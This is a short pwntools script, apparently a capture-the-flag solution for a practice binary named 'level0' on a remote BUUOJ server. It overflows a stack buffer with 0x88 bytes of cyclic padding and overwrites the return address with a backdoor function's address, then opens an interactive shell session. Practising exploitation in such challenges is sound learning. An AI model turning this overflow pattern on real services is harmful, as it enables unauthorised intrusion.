from pwn import *


# p = process("./level0")
p = remote("node4.buuoj.cn", 25581)

back_door = 0x0000000000400596 
payload = cyclic(0x80+0x8)+p64(back_door)
p.sendline(payload)

p.interactive()


